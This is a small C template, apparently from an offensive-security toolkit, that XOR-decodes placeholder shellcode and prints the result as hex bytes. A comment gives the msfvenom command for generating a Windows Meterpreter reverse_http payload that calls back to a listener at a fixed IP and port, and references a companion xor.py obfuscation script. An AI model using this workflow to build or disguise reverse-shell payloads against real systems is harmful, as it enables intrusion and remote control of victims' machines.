#include <windows.h>
#include <stdio.h>

// compile: 
//	cl.exe /nologo /MT /Tcxor.c /link /out:xor.exe /SUBSYSTEM:CONSOLE /MACHINE:x64

int main(void)
{	
	// msfvenom -p windows/x64/meterpreter/reverse_http LHOST=192.168.190.134 LPORT=80 -f csharp | tr -d \\n
	// python3 xor.py
	char shellcode[###SC_LENGTH###] = {###SHELLCODE###};
	int xorkey = ###XORKEY###;

	// XOR each byte of our shellcode with the key to decode it
	for (int idx = 0;  idx < sizeof(shellcode); idx++) {
        shellcode[idx] = shellcode[idx] ^ xorkey;
	}

	int idx = 0;
	while ( idx < sizeof(shellcode))
	{
		if (idx == (sizeof(shellcode) - 1) )
		{
			printf("0x%02x ", (unsigned char)shellcode[idx]);
		}
		else
		{
			printf("0x%02x, ", (unsigned char)shellcode[idx]);
		}
		idx++;
	}


	return 0;
}
          
